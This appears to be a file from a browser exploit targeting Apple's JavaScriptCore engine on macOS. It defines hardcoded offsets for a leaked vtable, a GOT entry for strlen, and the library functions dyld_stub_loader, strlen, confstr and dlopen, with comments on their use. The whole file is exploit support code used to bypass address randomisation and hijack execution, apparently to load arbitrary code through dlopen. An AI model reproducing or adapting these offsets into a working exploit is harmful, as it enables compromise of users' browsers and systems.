// We could get rid of this entire file by either searching for memory patters (of the function code) or
// by writing a mach-o/dyld_shared_cache parser in JavaScript. Offsets are fine for this purpose though...

// Offset of leaked vtable from the base of the JavaScriptCore .bss section
const JSC_VTAB_OFFSET = 0xe5e8;

// Offset of dyld_stub_loader from the base of libdyld.dylib
const DYLD_STUB_LOADER_OFFSET = 0x1278;

// Offset of GOT entry for strlen from the base of the JavaScriptCore .bss section
const STRLEN_GOT_OFFSET = 0xee0;

// Offset of strlen from the base of libsystem_c.dylib
const STRLEN_OFFSET = 0x1420;

// Offset of confstr from the base of libsystem_c.dylib
const CONFSTR_OFFSET = 0x24dc;

// Offset of dlopen from the base of libdyld.dylib
const DLOPEN_OFFSET = 0x2e30;
